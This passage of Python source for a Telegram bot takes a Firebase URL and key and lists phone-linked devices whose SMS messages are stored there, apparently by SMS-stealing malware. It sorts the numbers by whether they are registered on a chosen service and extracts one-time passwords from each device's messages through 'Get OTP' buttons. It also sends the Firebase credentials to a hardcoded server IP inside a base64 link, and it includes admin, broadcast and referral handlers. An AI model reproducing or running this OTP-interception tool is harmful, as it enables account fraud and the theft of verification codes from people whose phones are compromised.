        "registered": len(registered),
        "unregistered": len(unregistered),
        "errors": len(errors)
    }
    data["firebase_history"].append(scan_record)
    # Keep last 100 scans
    if len(data["firebase_history"]) > 100:
        data["firebase_history"] = data["firebase_history"][-100:]
    save_data(data)
    
    return WAITING_OTP_DEVICE

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    dev_id = query.data.replace("otp_", "")
    
    fb_url = context.user_data.get("firebase_url")
    fb_key = context.user_data.get("firebase_key")
    devices = context.user_data.get("devices", [])
    
    # Find device info
    dev_info = next((d for d in devices if d["id"] == dev_id), None)
    dev_name = dev_info["name"] if dev_info else dev_id
    dev_phone = dev_info["phone"] if dev_info else "—"
    
    # Generate web link for OTP
    import base64
    share_data = f"{fb_url}|||{fb_key}|||{dev_id}"
    encoded = base64.b64encode(share_data.encode()).decode()
    web_link = f"http://{get_server_ip()}/otp.html?s={encoded}"
    
    await query.message.edit_text(
        f"🔑 **Get OTP for Device:**\n\n"
        f"📟 **Device:** {dev_name}\n"
        f"📱 **Number:** `{dev_phone}`\n"
        f"🆔 **ID:** `{dev_id}`\n\n"
        f"⏳ Fetching latest SMS...",
        parse_mode="Markdown"
    )
    
    # Fetch messages and look for OTP
    messages_data = firebase_get(fb_url, fb_key, f"messages/{dev_id}")
    
    if isinstance(messages_data, dict) and "error" in messages_data:
        text = f"❌ Error: `{messages_data['error']}`"
        await query.message.edit_text(text, parse_mode="Markdown")
        return WAITING_OTP_DEVICE
    
    otp, raw_msg = extract_otp_from_messages(messages_data)
    
    buttons = [
        [InlineKeyboardButton("🔄 Refresh OTP", callback_data=f"otp_{dev_id}")],
        [InlineKeyboardButton("🌐 Open OTP Web Page", url=web_link)],
        [InlineKeyboardButton("🔙 Back to Results", callback_data="back_results")]
    ]
    
    if otp:
        text = (
            f"🔑 **OTP Found!**\n\n"
            f"📟 Device: {dev_name}\n"
            f"📱 Number: `{dev_phone}`\n\n"
            f"🔐 **OTP: `{otp}`**\n\n"
            f"💬 Message:\n`{raw_msg[:200]}`\n\n"
            f"🌐 [Live OTP Page]({web_link})"
        )
    else:
        # Build last 5 messages fallback
        last_msgs = ""
        if messages_data and isinstance(messages_data, dict):
            all_msgs = []
            for msg_id, msg_val in messages_data.items():
                if isinstance(msg_val, dict):
                    body = msg_val.get("body", msg_val.get("message", msg_val.get("text", "")))
                    sender = msg_val.get("address", msg_val.get("sender", msg_val.get("from", "Unknown")))
                    ts = msg_val.get("date", msg_val.get("timestamp", 0))
                    if body:
                        all_msgs.append({"body": body, "sender": sender, "ts": ts})
            # Sort by timestamp descending
            all_msgs.sort(key=lambda x: x.get("ts", 0), reverse=True)
            for m in all_msgs[:5]:
                snippet = m["body"][:100].replace("`", "'")
                last_msgs += f"• [{m['sender']}]: `{snippet}`\n"
        
        if last_msgs:
            text = (
                f"⏳ **No OTP found yet**\n\n"
                f"📟 Device: {dev_name}\n"
                f"📱 Number: `{dev_phone}`\n\n"
                f"📨 **Last 5 Messages:**\n{last_msgs}\n"
                f"Tap 🔄 Refresh after triggering OTP.\n\n"
                f"🌐 [Live OTP Page]({web_link})"
            )
        else:
            text = (
                f"⏳ **No OTP found yet**\n\n"
                f"📟 Device: {dev_name}\n"
                f"📱 Number: `{dev_phone}`\n\n"
                f"📭 No messages available on this device.\n"
                f"Tap 🔄 Refresh after triggering OTP.\n\n"
                f"🌐 [Live OTP Page]({web_link})"
            )
    
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    return WAITING_OTP_DEVICE

async def back_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    service = context.user_data.get("service", "")
    registered = context.user_data.get("registered", [])
    unregistered = context.user_data.get("unregistered", [])
    
    text = f"✅ **Results — {service}**\n\n"
    text += f"✅ Registered: {len(registered)}\n"
    text += f"❌ Unregistered: {len(unregistered)}\n\n"
    
    buttons = []
    for dev in unregistered[:20]:
        phone = dev["phone"]
        text += f"• `{phone}` — {dev['name']} {'🟢' if dev['status'] else '🔴'}\n"
        buttons.append([InlineKeyboardButton(f"🔑 Get OTP — {phone}", callback_data=f"otp_{dev['id']}")])
    
    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    return WAITING_OTP_DEVICE

def get_server_ip():
    return "34.162.127.159"

# ===== ADMIN HANDLERS =====
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if not is_admin(user.id):
        await update.message.reply_text("🚫 Unauthorized.")
        return ConversationHandler.END

    buttons = [
        [InlineKeyboardButton("📊 API Balance", callback_data="adm_balance"),
         InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("👥 Users", callback_data="adm_users"),
         InlineKeyboardButton("📈 Stats", callback_data="adm_stats")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="adm_ban"),
         InlineKeyboardButton("✅ Unban User", callback_data="adm_unban")],
        [InlineKeyboardButton("➕ Add Admin", callback_data="adm_addadmin")],
        [InlineKeyboardButton("📢 Add Channel", callback_data="adm_addchannel"),
         InlineKeyboardButton("📢 Remove Channel", callback_data="adm_rmchannel")],
        [InlineKeyboardButton("🎯 Set Referral Target", callback_data="adm_reftarget")]
    ]
    await update.message.reply_text("⚙️ **Admin Panel:**", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    return WAITING_NUMBER

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id):
        await query.edit_message_text("🚫 Unauthorized.")
        return ConversationHandler.END

    action = query.data.replace("adm_", "")

    if action == "balance":
        try:
            r = requests.get(f"{API_BASE}/api/v1/me", headers=HEADERS, timeout=10)
            info = r.json()
            usage = info.get("usage", {})
            text = f"📊 **API Balance:**\n\n"
            text += f"• **Rate Limit:** {info.get('rate_limit_seconds', 'N/A')}s\n"
            text += f"• **Daily Usage:** {usage.get('daily', 0)}\n"
            text += f"• **Monthly Usage:** {usage.get('monthly', 0)}\n"
        except:
            text = "❌ Failed to fetch balance."
        await query.edit_message_text(text, parse_mode="Markdown")
        return ConversationHandler.END

    elif action == "users":
        data = load_data()
        users = data["users"]
        text = f"👥 **Total Users: {len(users)}**\n\n"
        for u in users[:50]:
            username = f"@{u['username']}" if u.get('username') else "No username"
            text += f"• `{u['id']}` — {username}\n"
        await query.edit_message_text(text, parse_mode="Markdown")
        return ConversationHandler.END

    elif action == "stats":
        data = load_data()
        text = f"📈 **Bot Stats:**\n\n• **Total Users:** {len(data['users'])}\n• **Banned:** {len(data['banned'])}\n• **Admins:** {len(data['admins'])}"
        await query.edit_message_text(text, parse_mode="Markdown")
        return ConversationHandler.END

    elif action == "broadcast":
        await query.edit_message_text("📢 **Send the message to broadcast:**", parse_mode="Markdown")
        return ADMIN_BROADCAST

    elif action == "ban":
        await query.edit_message_text("🚫 **Enter User ID to ban:**", parse_mode="Markdown")
        return ADMIN_BAN

    elif action == "unban":
        await query.edit_message_text("✅ **Enter User ID to unban:**", parse_mode="Markdown")
        return ADMIN_UNBAN

    elif action == "addadmin":
        await query.edit_message_text("➕ **Enter User ID to add as admin:**", parse_mode="Markdown")
        return ADMIN_ADD_ADMIN

    elif action == "addchannel":
        data = load_data()
        channels = data.get("required_channels", [])
        ch_list = "\n".join([f"• `{c}`" for c in channels]) if channels else "None"
        await query.edit_message_text(
            f"📢 **Current Required Channels:**\n{ch_list}\n\n"
            f"Send channel username (e.g. `@mychannel`):",
            parse_mode="Markdown"
        )
        return ADMIN_ADD_CHANNEL

    elif action == "rmchannel":
        data = load_data()
        channels = data.get("required_channels", [])
        if not channels:
            await query.edit_message_text("📢 No required channels configured.", parse_mode="Markdown")
            return ConversationHandler.END
        buttons = [[InlineKeyboardButton(f"❌ {c}", callback_data=f"rmch_{c}")] for c in channels]
        await query.edit_message_text(
            "📢 **Select channel to remove:**",
            reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown"
        )
        return ADMIN_REMOVE_CHANNEL

    elif action == "reftarget":
        data = load_data()
        current = data.get("referral_target", 2)
        buttons = [
            [InlineKeyboardButton(f"{'✅ ' if current == 1 else ''}1 Referral", callback_data="reft_1"),
             InlineKeyboardButton(f"{'✅ ' if current == 2 else ''}2 Referrals", callback_data="reft_2"),
             InlineKeyboardButton(f"{'✅ ' if current == 3 else ''}3 Referrals", callback_data="reft_3")]
        ]
        await query.edit_message_text(
            f"🎯 **Current referral target:** {current}\n\nSelect new target:",
            reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown"
        )
        return ADMIN_REF_TARGET

    return ConversationHandler.END


async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    message = update.message.text
    success = failed = 0
    for u in data["users"]:
        try:
            await context.bot.send_message(chat_id=u["id"], text=message)
            success += 1
        except:
            failed += 1
    await update.message.reply_text(f"📢 **Done!** ✅ {success} | ❌ {failed}", parse_mode="Markdown")
    return ConversationHandler.END

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(update.message.text.strip())
        data = load_data()
        if user_id not in data["banned"]:
            data["banned"].append(user_id)
            save_data(data)
        await update.message.reply_text(f"🚫 `{user_id}` banned.", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Invalid ID.")
    return ConversationHandler.END

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(update.message.text.strip())
        data = load_data()
        if user_id in data["banned"]:
            data["banned"].remove(user_id)
            save_data(data)
        await update.message.reply_text(f"✅ `{user_id}` unbanned.", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Invalid ID.")
    return ConversationHandler.END

async def admin_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = int(update.message.text.strip())
        data = load_data()
        if user_id not in data["admins"]:
            data["admins"].append(user_id)
            save_data(data)
        await update.message.reply_text(f"➕ `{user_id}` is now admin.", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Invalid ID.")
    return ConversationHandler.END

async def admin_add_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle channel username input for adding required channel"""
    if not is_admin(update.message.from_user.id):
        return ConversationHandler.END
    text = update.message.text.strip()
    if not text.startswith("@"):
        text = "@" + text
    data = load_data()
    channels = data.get("required_channels", [])
    if text in channels:
        await update.message.reply_text(f"⚠️ `{text}` is already required.", parse_mode="Markdown")
        return ConversationHandler.END
    channels.append(text)
    data["required_channels"] = channels
    save_data(data)
    await update.message.reply_text(f"✅ Added `{text}` to required channels.", parse_mode="Markdown")
    return ConversationHandler.END

async def admin_remove_channel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle callback for removing a required channel"""
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id):
        return ConversationHandler.END
    channel = query.data.replace("rmch_", "")
    data = load_data()
    channels = data.get("required_channels", [])
    if channel in channels:
        channels.remove(channel)
        data["required_channels"] = channels
        save_data(data)
        await query.edit_message_text(f"✅ Removed `{channel}` from required channels.", parse_mode="Markdown")
    else:
        await query.edit_message_text(f"⚠️ `{channel}` not found.", parse_mode="Markdown")
    return ConversationHandler.END

async def admin_ref_target_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle callback for setting referral target"""
    query = update.callback_query
    await query.answer()
    if not is_admin(query.from_user.id):
        return ConversationHandler.END
    try:
        target = int(query.data.replace("reft_", ""))
        if target not in (1, 2, 3):
            target = 2
    except:
        target = 2
    data = load_data()
    data["referral_target"] = target
    save_data(data)
    await query.edit_message_text(f"✅ Referral target set to **{target}**.", parse_mode="Markdown")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ===== MAIN =====
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # User conversation (Manual + Auto)
    user_conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_MODE: [
                CallbackQueryHandler(mode_selected, pattern=r"^mode_"),
                CallbackQueryHandler(verify_channels, pattern=r"^verify_channels$"),
                CallbackQueryHandler(back_start, pattern=r"^back_start$"),
            ],
            WAITING_NUMBER: [
                CallbackQueryHandler(service_selected_manual, pattern=r"^msvc_"),
                CallbackQueryHandler(back_start, pattern=r"^back_start$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, number_received),
            ],
            WAITING_SERVICE_AUTO: [
                CallbackQueryHandler(service_selected_auto, pattern=r"^asvc_"),
                CallbackQueryHandler(back_start, pattern=r"^back_start$"),
            ],
            WAITING_FIREBASE_URL: [
                CallbackQueryHandler(back_start, pattern=r"^back_start$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, firebase_url_received),
            ],
            WAITING_FIREBASE_KEY: [
                CallbackQueryHandler(back_start, pattern=r"^back_start$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, firebase_key_received),
            ],
            WAITING_PROBE_CHOICE: [
                CallbackQueryHandler(probe_choice, pattern=r"^probe_"),
                CallbackQueryHandler(back_start, pattern=r"^back_start$"),
            ],
            WAITING_OTP_DEVICE: [
                CallbackQueryHandler(get_otp, pattern=r"^otp_"),
                CallbackQueryHandler(back_results, pattern=r"^back_results"),
            ],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    # Admin conversation
    admin_conv = ConversationHandler(
        entry_points=[CommandHandler("admin", admin)],
        states={
            WAITING_NUMBER: [
                CallbackQueryHandler(admin_callback, pattern=r"^adm_"),
            ],
            ADMIN_BROADCAST: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, admin_broadcast),
            ],
            ADMIN_BAN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, admin_ban),
            ],
            ADMIN_UNBAN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, admin_unban),
            ],
            ADMIN_ADD_ADMIN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_admin),
            ],
            ADMIN_ADD_CHANNEL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, admin_add_channel_handler),
            ],
            ADMIN_REMOVE_CHANNEL: [
                CallbackQueryHandler(admin_remove_channel_handler, pattern=r"^rmch_"),
            ],
            ADMIN_REF_TARGET: [
                CallbackQueryHandler(admin_ref_target_handler, pattern=r"^reft_"),
            ],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("admin", admin), CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )

    app.add_handler(admin_conv)
    app.add_handler(user_conv)

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
